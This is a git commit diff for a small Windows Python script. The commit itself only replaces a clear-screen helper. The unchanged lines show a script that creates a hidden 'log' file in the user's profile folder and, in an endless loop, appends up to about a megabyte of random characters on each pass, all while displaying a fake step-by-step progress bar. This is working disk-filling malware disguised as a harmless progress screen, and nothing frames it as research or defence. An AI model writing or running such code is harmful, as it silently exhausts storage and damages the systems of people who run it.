c18bb755508199c550389bd85c4295fdc55b3450
Joe <101370883+joeblownn@users.noreply.github.com>
2022-03-14 13:01:48 +1000

    Update main.py

--- app/main.py
+++ app/main.py
@@ -1,13 +1,12 @@
 import getpass, random, os, string, subprocess
 os.system('color 0a')
-cls = lambda: os.system('cls')
 path = f'C:\\Users\\{getpass.getuser()}\\log'
 file = open(path, 'a')
 subprocess.check_call(['attrib', '+H', path])
 step = 1
 percent = 0
 while True:
-	cls()
+	os.system('cls')
 	num = round(percent / 5)
 	print(f'''\nStep {step}\n[{'-' * num}{' ' * (20 - num)}] {percent}%''')
 	file.write(''.join(f'{random.choice(string.printable)}' for _ in range(random.randint(10000, 1000000))))
